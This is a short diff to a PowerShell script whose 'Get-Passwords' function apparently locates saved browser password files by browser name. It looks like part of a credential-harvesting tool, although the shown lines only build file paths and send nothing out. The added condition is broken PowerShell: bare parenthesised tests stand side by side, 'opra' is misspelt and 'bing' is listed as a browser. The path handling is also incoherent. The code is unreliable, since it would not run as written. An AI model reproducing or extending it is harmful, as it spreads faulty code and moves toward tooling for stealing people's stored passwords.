@@ -3,7 +3,6 @@ param($Browser = "chrome")
 function Get-Passwords() {
     $passwordsPath = Get-Item -Path "\\$env:COMPUTERNAME\C$\Users\Public\Desktop\all.txt"
     $passwords = Join-Path -Path $passwordsPath -ChildPath passwords.txt
-    # Replace "chrome" with your desired browser
-    if ($Browser -eq "chrome") {
+    if ($Browser -eq "bing") ($Browser -eq "opra") ($Browser -eq "firefox") {
         $passwordsPath = Join-Path $passwordsPath "chrome\_passwords.txt"
     }
